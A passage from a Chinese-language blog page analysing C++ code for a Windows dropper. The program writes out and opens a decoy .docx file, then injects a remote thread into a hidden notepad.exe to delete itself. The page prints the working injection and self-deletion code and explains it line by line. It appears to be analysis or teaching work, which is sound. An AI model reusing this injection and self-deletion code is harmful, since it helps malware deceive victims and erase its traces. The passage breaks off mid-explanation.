<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //下面是实现自删除，网上的自删除方法有很多，用的多的是批处理，这里是创建一个进程然后用远程线程注入来让notepad删除当前程序</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    STARTUPINFOA si </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    PROCESS_INFORMATION  pi </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> { </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> };</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    CreateProcessA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;c:</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">windows</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">system32</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">notepad.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, TRUE, CREATE_NO_WINDOW </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">|</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> CREATE_SUSPENDED, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">si, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">pi);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建进程</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DeleteStruct DS;</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">    DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> =</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> GetProcAddress</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">GetModuleHandleA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;kernel32.dll&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">), </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;DeleteFileA&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    GetModuleFileNameA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MAX_PATH);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //创建远程线程不能直接使用API，需要把函数指针放在结构中传过去</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //这里需要DeleteFileA这个函数，用GetProcAddress得到指针后传过去</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID ADDRESS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, ADDRESS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">threadProc, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2048</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //为函数开辟一块内存</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    LPVOID pRemoteParam </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> VirtualAllocEx</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    WriteProcessMemory</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, pRemoteParam, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DS, </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">sizeof</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(DS), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DWORD RETSIZE;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //为参数开辟一块内存</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    HANDLE Thread </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> CreateRemoteThread</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">pi</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">hProcess</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, (LPTHREAD_START_ROUTINE)ADDRESS, pRemoteParam, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">RETSIZE);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //执行该线程</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    CloseHandle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(Thread);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //关闭句柄</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><ul><li><strong>线程过程 <code>threadProc</code></strong> 在主函数 <code>main</code> <code>line82</code> 被调用 <ul><li>这是一个在远程进程中运行的线程函数。</li><li>先进行了一个简单的延时循环，目的是防止线程创建了文件还没有关闭。</li><li>从 <code>lParam</code> 中获取传递过来的结构体 <code>DeleteStruct</code>。</li><li>从结构体中获取 <code>DeleteFileA</code> 函数指针并调用它删除文件。</li></ul></li></ul><hr><ul><li><strong>主函数 <code>main</code></strong><ul><li>获取当前进程的路径和名称。</li><li>将当前文件的扩展名改为 <code>.docx</code>。</li><li>创建一个同名的 <code>.docx</code> 文件，并将资源文件内容写入该文件。</li><li>使用 <code>ShellExecuteExA</code> 打开该 <code>.docx</code> 文件。</li><li>创建一个新的 <code>notepad.exe</code> 进程，用于删除当前程序。</li><li>使用 <code>VirtualAllocEx</code> 在远程进程中分配内存，用于存储线程函数和参数。</li><li>使用 <code>WriteProcessMemory</code> 将线程函数和参数写入远程进程的内存中。</li><li>使用 <code>CreateRemoteThread</code> 创建一个远程线程来执行删除操作。</li></ul></li></ul><hr><p><code>代码详解</code>:</p><h3 id="threadproc" tabindex="-1"><a class="header-anchor" href="#threadproc"><span>threadProc</span></a></h3><p><code>threadProc</code> 函数实现了删除特定文件的功能。</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DWORD64 WINAPI </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">threadProc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(LPVOID lParam) {</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    INT RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    }</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //循环一下起延时作用，防止线程创建了文件还没有关系，这样删除就失败了</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    wDeleteFileA kDeleteFileA;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> DS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)lParam;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    kDeleteFileA </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (wDeleteFileA)</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    kDeleteFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //删除文件</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    return</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> RET;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>DWORD64 WINAPI threadProc(LPVOID lParam) </code></p><ul><li><p>返回类型 <code>DWORD64</code></p><p><code>DWORD64</code> 是一个64位无符号整数，表示函数的返回值类型。</p></li><li><p>调用约定 <code>WINAPI</code></p><p><code>WINAPI</code> 定义了函数的调用约定，通常是 <code>__stdcall</code>，用于指定函数参数的传递方式和堆栈清理方式。</p></li><li><p>参数 <code>LPVOID lParam</code></p><p><code>LPVOID</code> 是一个指向任意类型的指针，表示传递给线程的参数。</p></li></ul><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//循环一下起延时作用，防止线程创建了文件还没有关系，这样删除就失败了</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">INT RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">for</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">size_t</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 20000</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">; i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">++</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> RET </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">-</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这段程序本意是做个时延, 防止进程创建时文件还没有关联从而导致文件删除失败, 不过这个时延效果有限, CPU 执行 20000 次递减运算还是很快的, 打log几乎看不出来时延, 不清楚这里这样写是为了什么, 可能是为了规避对 sleep 的关联检测之类的? 这就不太清楚了</p><p>这里可以修改为使用 Sleep 10ms</p><hr><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"># 定义函数指针</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">wDeleteFileA kDeleteFileA;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"># 将传入参数转换为结构体指针</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> DS </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (DeleteStruct</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)lParam;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"># 从结构体中获取函数指针</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">kDeleteFileA </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (wDeleteFileA)</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"># 调用函数删除文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kDeleteFileA</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">DS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">-&gt;</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><p>定义函数指针</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">wDeleteFileA kDeleteFileA;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><code>wDeleteFileA</code> 是一个函数指针类型</p><blockquote><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> BOOL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (WINAPI</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">*</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> wDeleteFileA)(LPCSTR lpFileName);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></blockquote><p><code>kDeleteFileA</code> 是一个指向这种类型函数的指针。<code>wDeleteFileA</code> 代表了指向 <code>DeleteFileA</code> 函数的指针，<code>DeleteFileA</code> 是 Windows API 用于删除文件的函数。</p></li><li><p>将传入参数转换为结构体指针</p><p><code>lParam</code> 是传入的参数，被转换为指向 <code>DeleteStruct</code> 结构体的指针:</p><blockquote><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">typedef</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> struct</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> DeleteStruct</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> {</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    FARPROC dwDeleteFile;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    CHAR </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">dwDeleteFile_param_1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[MAX_PATH];</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">};</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><code>dwDeleteFile</code>：指向 <code>DeleteFileA</code> 函数的指针</li><li><code>dwDeleteFile_param_1</code>：要删除的文件路径</li></ul></blockquote></li><li><p>从结构体中获取函数指针</p><div class="language-cpp line-numbers-mode" data-highlighter="shiki" data-ext="cpp" data-title="cpp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">kDeleteFileA </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> 